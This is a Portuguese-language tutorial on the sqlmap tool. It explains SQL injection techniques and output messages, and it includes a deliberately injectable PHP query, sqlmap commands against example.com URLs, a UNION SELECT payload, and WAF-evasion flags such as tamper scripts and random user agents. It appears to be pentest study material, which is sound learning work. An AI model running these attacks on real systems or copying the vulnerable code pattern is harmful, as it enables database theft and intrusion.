# 💉 SQLmap — Visão Geral

O sqlmap é uma ferramenta escrita em Python que automatiza:

* detecção de SQL Injection (SQLi);
* exploração da vulnerabilidade;
* enumeração de banco de dados;
* extração de dados.


---

# 🗄️ Bancos de Dados Suportados

O SQLmap suporta diversos SGBDs:

* MySQL
* SQLite
* Oracle
* PostgreSQL
* Firebird
* Microsoft SQL Server
* MariaDB
* IBM DB2
* Sybase
* e outros

---

# ⚔️ Tipos de SQL Injection Suportados

Utilizamos:

```bash id="r3quk0"
--technique=TECH
```

## Técnicas

| Letra | Técnica             | Descrição                      |
| ----- | ------------------- | ------------------------------ |
| B     | Boolean-based blind | Baseada em respostas booleanas |
| E     | Error-based         | Baseada em mensagens de erro   |
| U     | Union query-based   | Uso de UNION SELECT            |
| S     | Stacked queries     | Múltiplas queries              |
| T     | Time-based blind    | Baseada em atraso/resposta     |
| Q     | Inline queries      | Queries inline                 |

---

## ⚡ Velocidade das Técnicas

### Mais rápida

* `UNION query-based`

### Mais lentas

* `Boolean-based`
* `Time-based`

Porque precisam fazer múltiplas requisições para inferir informações.

---

# 🚀 Primeiros Passos

## Opções básicas

```bash id="tq2vgn"
sqlmap -h
```

Suficiente para a maioria dos casos.

---

## Opções avançadas

```bash id="2n1yy4"
sqlmap -hh
```

Mostra funcionalidades avançadas.

---

# 🎯 Cenário Básico

Uma aplicação recebe o ID do usuário via GET:

```php id="w7q3b7"
$link = mysqli_connect($host, $username, $password, $database, 3306);

$sql = "SELECT * FROM users WHERE id = " . $_GET["id"] . " LIMIT 0, 1";

$result = mysqli_query($link, $sql);

if (!$result)
    die("<b>SQL error:</b> ". mysqli_error($link) . "<br>\n");
```

---

## 🔥 Problema

O parâmetro `id` é inserido diretamente na query SQL.

Isso pode gerar:

* SQL Injection;
* XSS (dependendo do contexto);
* Vazamento de erros.

---

# ⚠️ Vazamento de Erros

A aplicação retorna erros SQL:

```php id="6nql0k"
die("<b>SQL error:</b> ". mysqli_error($link));
```

Isso facilita:

* detecção de SQLi;
* identificação do SGBD;
* criação de payloads.

---

# 🌐 URL Vulnerável

```text id="b8cl2v"
http://www.example.com/vuln.php?id=1
```

---

# ▶️ Executando SQLmap

```bash id="m52d8y"
sqlmap -u "http://www.example.com/vuln.php?id=1" --batch
```

## Flags

| Flag      | Função                               |
| --------- | ------------------------------------ |
| `-u`      | Define URL                           |
| `--batch` | Usa respostas padrão automaticamente |

---

# 🔍 Entendendo a Saída do SQLmap

## 📌 Conteúdo estável

```text id="clt2c4"
target URL content is stable
```

A página responde de forma consistente.

Facilita detectar SQLi.

---

## 📌 Parâmetro dinâmico

```text id="r0a6jw"
GET parameter 'id' appears to be dynamic
```

Mudanças no parâmetro alteram a resposta.

Bom sinal para testes.

---

## 📌 Teste heurístico

```text id="c0r18t"
heuristic (basic) test shows that GET parameter 'id' might be injectable
```

O SQLmap:

* injeta valores inválidos;
* observa erros e mudanças.

Exemplo:

```text id="a6q7k8"
?id=1"))'))...
```

⚠️ Isso NÃO confirma SQLi.
É apenas um indicativo.

---

## 📌 Identificação do banco

```text id="qz3k19"
possible DBMS: 'MySQL'
```

O SQLmap tenta identificar o SGBD.

---

# 🧪 Teste Rápido de XSS

```text id="y0k2wa"
heuristic (XSS) test shows that GET parameter 'id' might be vulnerable
```

O SQLmap também faz testes simples de XSS.

---

# 🗃️ Testes Específicos por Banco

```text id="pq3m0d"
Do you want to skip test payloads specific for other DBMSes?
```

Se o banco foi identificado:

* podemos focar apenas nele;
* reduzimos tempo;
* diminuímos ruído.

---

# 📈 Ampliação de Testes

```text id="8m4v2g"
extending provided level (1) and risk (1)
```

O SQLmap pode aumentar:

* quantidade de payloads;
* agressividade dos testes.

---

# 🔄 UNION Query

```text id="uqm6m1"
UNION query injection technique
```

O SQLmap tenta:

* descobrir número de colunas;
* identificar UNION SELECT utilizável.

---

# 📊 ORDER BY

```text id="e9k1yq"
ORDER BY technique appears to be usable
```

Usado para descobrir:

* quantidade correta de colunas.

Exemplo manual:

```sql id="6r2g5f"
ORDER BY 1
ORDER BY 2
ORDER BY 3
```

---

# ✅ Vulnerabilidade Confirmada

```text id="k5h3pw"
GET parameter 'id' is vulnerable
```

O parâmetro foi considerado vulnerável.

---

# 📝 Logs

```text id="u0f4pk"
fetched data logged to text files
```

Os resultados ficam salvos em:

```text id="6jp2mg"
/home/user/.sqlmap/output/
```

---

# 🌐 SQLmap com HTTP Requests

## ⚠️ Cuidados

Ao montar requisições:

* não esquecer cookies;
* não errar headers;
* não formatar POST incorretamente.

---

# 🛠️ Melhor Método: Copy as cURL

Nas DevTools do navegador:

1. Clique na requisição;
2. Copy;
3. Copy as cURL.

Depois cole no terminal.

---

# 🔄 GET vs POST

## GET

Parâmetros na URL.

```bash id="tbk6jm"
sqlmap -u "http://site.com/?id=1"
```

---

## POST

Usamos:

```bash id="j5k3qn"
--data
```

Exemplo:

```bash id="0p1cz8"
sqlmap -u "http://site.com" --data="uid=1&name=test"
```

---

# 🎯 Especificando o Parâmetro

Muito importante para reduzir falsos negativos.

## Com `-p`

```bash id="4mdvho"
-p uid
```

---

## Com `*`

```bash id="y2x0f3"
uid=1*
```

---

# 🧾 JSON e XML

O SQLmap suporta:

## JSON

```json id="d7x4uq"
{"id":1}
```

## XML

```xml id="oj9cl3"
<element><id>1</id></element>
```

---

# 📄 Requests Complexos

Podemos usar uma requisição completa salva em arquivo.

## Flag

```bash id="v0j9jz"
-r request.txt
```

Muito útil com:

* Burp Suite;
* Requests enormes;
* APIs.

---

# 🧰 Personalizando Requisições

## Cookies

```bash id="s0f9z8"
--cookie
```

---

## Headers

```bash id="1pz3jq"
-H
--header
```

---

## User-Agent

```bash id="g5v0fd"
-A
--user-agent
```

---

## Agente Aleatório

```bash id="8mxq1r"
--random-agent
```

Importante porque muitos WAFs bloqueiam o User-Agent padrão do SQLmap.

---

# 📱 Simular Celular

```bash id="4k4o1u"
--mobile
```

---

# 🔄 Alterar Método HTTP

```bash id="p1qt5q"
sqlmap -u www.site.com --data='id=1' --method PUT
```

---

# 🧮 Definir Número de Colunas

```bash id="q7w0pj"
--union-cols
```

Útil quando já sabemos a quantidade.

---

# 🐞 Lidando com Erros

## Mostrar erros

```bash id="6vw3aj"
--parse-errors
```

---

## Salvar tráfego

```bash id="h7a5yr"
-t
```

---

## Verbosidade

```bash id="r7g8xj"
-v
```

---

## Proxy

```bash id="w0a5lw"
--proxy
```

Permite:

* interceptar no Burp;
* analisar requisições;
* debugar ataques.

---

# 🧩 Prefixo e Sufixo

Algumas aplicações possuem contextos específicos:

* aspas;
* parênteses;
* LIKE;
* concatenações.

Usamos:

```bash id="jq3u3m"
--prefix
--suffix
```

---

## Query Original

```sql id="v9x0wm"
SELECT id,name,surname FROM users
WHERE id LIKE (('" . $_GET["q"] . "'))
LIMIT 0,1
```

---

## Comando SQLmap

```bash id="5xk8ga"
sqlmap -u "www.example.com/?q=test" \
--prefix="%'))" \
--suffix="-- -"
```

---

## Resultado

```sql id="w8j4sm"
(('test%')) UNION ALL SELECT 1,2,VERSION()-- -')) LIMIT 0,1
```

---

# ⚙️ Risk e Level

## Level

```bash id="o2n8v2"
--level
```

Define:

* quantidade de vetores testados.

### Intervalo

* 1 a 5

### Padrão

* 1

---

## Risk

```bash id="k4w7mn"
--risk
```

Define:

* agressividade;
* risco de impacto;
* possibilidade de DoS.

### Intervalo

* 1 a 3

---

# 📊 Comparação

| Configuração     | Testes por parâmetro |
| ---------------- | -------------------- |
| level 1 + risk 1 | ~76                  |
| level 5 + risk 3 | ~7.865               |

---

# 🎯 Redução de Falsos Negativos

## ✅ Especificar parâmetro

```bash id="1x9t9u"
-p id
```

ou:

```text id="2q0m7n"
?id=1*
```

---

## ✅ Informar banco

```bash id="8txm18"
--dbms=mysql
```

---

## ✅ Informar técnica

```bash id="u3d9x2"
--technique=E
```

### Técnicas úteis

| Técnica | Tipo            |
| ------- | --------------- |
| E       | Error-based     |
| B       | Boolean         |
| U       | UNION           |
| T       | Time-based      |
| S       | Stacked Queries |

---

# 🛡️ Evasão de WAF

## Tamper Scripts

```bash id="3m7u5g"
--tamper=randomcase
```

Exemplo:

* mistura maiúsculas/minúsculas;
* tenta burlar filtros.

---

## Agentes aleatórios

```bash id="j0v2bw"
--random-agent
```

Ajuda a evitar bloqueios simples.

---

# 📌 Resumo Final

## SQLmap automatiza:

* detecção;
* exploração;
* enumeração;
* extração de dados.

---

## Técnicas mais importantes

* UNION (mais rápida)
* Error-based
* Boolean-based
* Time-based

---

## Flags essenciais

| Flag             | Função               |
| ---------------- | -------------------- |
| `-u`             | URL                  |
| `--data`         | Dados POST           |
| `-p`             | Parâmetro específico |
| `--batch`        | Sem interação        |
| `--dbms`         | Banco específico     |
| `--technique`    | Técnica SQLi         |
| `--risk`         | Agressividade        |
| `--level`        | Quantidade de testes |
| `--proxy`        | Proxy/Burp           |
| `--random-agent` | User-Agent aleatório |
| `--tamper`       | Bypass de filtros    |

